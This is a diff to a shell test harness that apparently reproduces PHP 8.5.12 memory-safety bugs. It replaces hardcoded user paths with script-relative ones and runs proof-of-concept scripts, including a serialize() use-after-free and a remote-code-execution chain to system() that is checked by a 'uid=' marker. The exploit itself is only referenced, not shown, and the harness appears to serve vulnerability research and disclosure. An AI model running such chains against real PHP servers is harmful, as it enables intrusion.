@@ -5,7 +5,7 @@
 # Prereqs (see README): plain2 (8.5.12), asan2 (ASAN), fixedasan (08f4b64),
 # and the system php (8.1.2) + up_client.py for the chain lanes.
 # ============================================================================
-Z=/mnt/c/Users/andre/Downloads/php2shell-zeros
+Z=$(cd "$(dirname "$0")" && pwd)
 P=/tmp/php8512_build/plain2/sapi/cli/php
 A=/tmp/php8512_build/asan2/sapi/cli/php
 F=/tmp/php8512_build/fixedasan/sapi/cli/php
@@ -42,12 +42,12 @@ OUT=$(timeout 60 env USE_ZEND_ALLOC=0 ASAN_OPTIONS=detect_leaks=0 $A -n vd6_carr
 echo "$OUT" | grep -q "heap-use-after-free" && ok "Z5 mirror UAF (ASAN receipt, php_var_serialize_destroy)" || bad "Z5 mirror (rerun vd6 under ASAN)"
 
 echo "--- Z5 RCE: serialize mirror -> self-reclaim -> zif_system (unconditional) ---"
-timeout 200 bash /mnt/c/Users/andre/Downloads/php2shell-claude/poc_matrix/pwn_zero5.sh > /tmp/z5r.log 2>&1
+timeout 200 bash "$Z/zero5_serialize_reentry/poc/pwn_zero5.sh" > /tmp/z5r.log 2>&1
 grep -q "uid=" /tmp/z5r.log && ok "Z5 RCE via serialize() on 8.5.12 (marker receipt)" || bad "Z5 RCE (rerun pwn_zero5.sh)"
 
 echo "--- POST-FIX (08f4b64): destructor bypass + leak on the fix itself ---"
 if [ -x "$F" ]; then
-  cd /tmp; cp /mnt/c/Users/andre/Downloads/php2shell-claude/poc_matrix/fb1_bailout_leak.php . 2>/dev/null
+  cd /tmp; cp "$Z/zero10_slow_bleed/repro/fb1_bailout_leak.php" . 2>/dev/null
   rm -f /tmp/fb1_X /tmp/fb1_Y /tmp/fb1_Z /tmp/fb1_W
   OUT=$(timeout 60 env USE_ZEND_ALLOC=0 ASAN_OPTIONS=detect_leaks=1 $F -n fb1_bailout_leak.php 2>&1)
   LEAK=$(echo "$OUT" | grep -c "leaked in")
